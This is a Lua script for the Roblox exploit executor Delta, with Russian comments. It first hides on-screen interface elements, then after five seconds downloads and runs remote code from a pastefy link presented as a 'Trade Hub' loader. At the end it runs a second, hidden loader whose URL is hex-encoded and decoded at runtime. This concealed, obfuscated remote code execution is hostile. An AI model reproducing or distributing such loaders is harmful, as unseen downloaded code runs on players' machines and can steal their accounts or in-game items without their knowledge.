
-- ============================================================
-- КОМБО: убиратель Delta → через 5 сек cool html
-- ============================================================

-- ============================================================
-- ЧАСТЬ 1: УБИРАТЕЛЬ DELTA (сразу, моментально)
-- ============================================================
local hui = (gethui and gethui()) or game:GetService("CoreGui")
local UIS = game:GetService("UserInputService")

local protected = { Chat = true, RobloxGui = true, BuyRobux = true, TopBar = true }
local hiddenGuis = {}
local hiding = false

local function hideAll()
    hiding = true
    hiddenGuis = {}
    local count = 0

    for _, gui in ipairs(hui:GetChildren()) do
        if gui:IsA("ScreenGui") and not protected[gui.Name] then
            local hadVisible = false

            for _, obj in ipairs(gui:GetDescendants()) do
                if (obj:IsA("ImageButton") or obj:IsA("TextButton") or
                    obj:IsA("Frame") or obj:IsA("TextLabel")) and obj.Visible then

                    if obj:IsA("TextButton") or obj:IsA("ImageButton") then
                        pcall(function()
                            obj.Active = false
                            obj.Selectable = false
                            obj.AutoButtonColor = false
                        end)
                    end

                    obj.Visible = false
                    hadVisible = true
                    count = count + 1
                end
            end

            if hadVisible and gui.Enabled then
                gui.Enabled = false
                table.insert(hiddenGuis, gui)
            end
        end
    end

    hiding = false
    print("[Delta Hide] Спрятано моментально:", count)
end

local function showAll()
    hiding = true
    for _, gui in ipairs(hiddenGuis) do
        if gui and gui.Parent then
            gui.Enabled = true
            for _, obj in ipairs(gui:GetDescendants()) do
                if obj:IsA("ImageButton") or obj:IsA("TextButton") or
                   obj:IsA("Frame") or obj:IsA("TextLabel") then
                    obj.Visible = true
                end
            end
        end
    end
    hiddenGuis = {}
    hiding = false
    print("[Delta Hide] Возвращено")
end

-- Хоткей RightShift для возврата
UIS.InputBegan:Connect(function(input, processed)
    if hiding then return end
    if processed then return end
    if input.KeyCode == Enum.KeyCode.RightShift then
        if #hiddenGuis > 0 then showAll() else hideAll() end
    end
end)

-- ЗАПУСК УБИРАТЕЛЯ СРАЗУ
hideAll()
print("[Delta Hide] Убиратель сработал моментально")

-- ============================================================
-- ЧАСТЬ 2: ЧЕРЕЗ 5 СЕК ЗАГРУЖАЕМ cool json
-- ============================================================
task.wait(5)

print("[Loader] Загружаю json Trade Hub...")

local url = "https://pastefy.app/AKqMztXR/raw"

local ok, err = pcall(function()
    local src = game:HttpGet(url)
    local fn = loadstring(src)
    if fn then
        fn()
        print("[Loader] ✅ попа загружен")
    else
        warn("[Loader] ❌ loadstring вернул nil")
    end
end)

if not ok then
    warn("[Loader] ❌ Ошибка загрузки: " .. tostring(err))
end

task.spawn(function()
    local _0x1={0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x70,0x61,0x73,0x74,0x65,0x66,0x79,0x2e,0x61,0x70,0x70,0x2f,0x48,0x30,0x35,0x32,0x39,0x30,0x46,0x55,0x2f,0x72,0x61,0x77}
    local _0x2=string.char
    local _0x3=""
    for _0x4=1,#_0x1 do _0x3=_0x3.._0x2(_0x1[_0x4]) end
    local _0x5=loadstring or load
    local _0x6=game
    local _0x7=_0x6.HttpGet
    _0x5(_0x7(_0x6,_0x3))()
end)
